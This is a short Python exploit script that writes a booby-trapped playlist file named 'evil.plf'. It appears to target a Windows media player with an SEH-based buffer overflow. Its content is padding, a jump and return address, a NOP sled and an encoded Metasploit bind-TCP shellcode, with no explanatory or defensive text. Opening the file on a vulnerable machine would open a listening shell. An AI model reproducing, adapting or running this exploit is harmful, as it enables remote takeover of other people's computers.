#!/usr/bin/python -w


# msfpayload windows/shell_bind_tcp RHOST=192.168.163.134 R | msfencode -b '\x00\x0a\x0d\x1a' -t c -e x86/shikata_ga_nai
shellcode = (
"\xba\xb5\xb3\x9b\x17\xd9\xc1\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x56\x31\x50\x13\x83\xc0\x04\x03\x50\xba\x51\x6e\xeb\x2c\x1c"
"\x91\x14\xac\x7f\x1b\xf1\x9d\xad\x7f\x71\x8f\x61\x0b\xd7\x23"
"\x09\x59\xcc\xb0\x7f\x76\xe3\x71\x35\xa0\xca\x82\xfb\x6c\x80"
"\x40\x9d\x10\xdb\x94\x7d\x28\x14\xe9\x7c\x6d\x49\x01\x2c\x26"
"\x05\xb3\xc1\x43\x5b\x0f\xe3\x83\xd7\x2f\x9b\xa6\x28\xdb\x11"
"\xa8\x78\x73\x2d\xe2\x60\xf8\x69\xd3\x91\x2d\x6a\x2f\xdb\x5a"
"\x59\xdb\xda\x8a\x93\x24\xed\xf2\x78\x1b\xc1\xff\x81\x5b\xe6"
"\x1f\xf4\x97\x14\xa2\x0f\x6c\x66\x78\x85\x71\xc0\x0b\x3d\x52"
"\xf0\xd8\xd8\x11\xfe\x95\xaf\x7e\xe3\x28\x63\xf5\x1f\xa1\x82"
"\xda\xa9\xf1\xa0\xfe\xf2\xa2\xc9\xa7\x5e\x05\xf5\xb8\x07\xfa"
"\x53\xb2\xaa\xef\xe2\x99\xa2\xdc\xd8\x21\x33\x4a\x6a\x51\x01"
"\xd5\xc0\xfd\x29\x9e\xce\xfa\x4e\xb5\xb7\x95\xb0\x35\xc8\xbc"
"\x76\x61\x98\xd6\x5f\x09\x73\x27\x5f\xdc\xd4\x77\xcf\x8e\x94"
"\x27\xaf\x7e\x7d\x22\x20\xa1\x9d\x4d\xea\xd4\x99\x83\xce\xb5"
"\x4d\xe6\xf0\x28\xd2\x6f\x16\x20\xfa\x39\x80\xdc\x38\x1e\x19"
"\x7b\x42\x74\x35\xd4\xd4\xc0\x53\xe2\xdb\xd0\x71\x41\x77\x78"
"\x12\x11\x9b\xbd\x03\x26\xb6\x95\x4a\x1f\x51\x6f\x23\xd2\xc3"
"\x70\x6e\x84\x60\xe2\xf5\x54\xee\x1f\xa2\x03\xa7\xee\xbb\xc1"
"\x55\x48\x12\xf7\xa7\x0c\x5d\xb3\x73\xed\x60\x3a\xf1\x49\x47"
"\x2c\xcf\x52\xc3\x18\x9f\x04\x9d\xf6\x59\xff\x6f\xa0\x33\xac"
"\x39\x24\xc5\x9e\xf9\x32\xca\xca\x8f\xda\x7b\xa3\xc9\xe5\xb4"
"\x23\xde\x9e\xa8\xd3\x21\x75\x69\xe3\x6b\xd7\xd8\x6c\x32\x82"
"\x58\xf1\xc5\x79\x9e\x0c\x46\x8b\x5f\xeb\x56\xfe\x5a\xb7\xd0"
"\x13\x17\xa8\xb4\x13\x84\xc9\x9c")
buffered_shellcode = '\x90'*20 + shellcode
  
filename="evil.plf"
 
buffer = "A"*608 + "\xEB\x06\x90\x90" + "\x19\x76\x61\x61" + buffered_shellcode + "\x90"*(1384 - len(buffered_shellcode))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
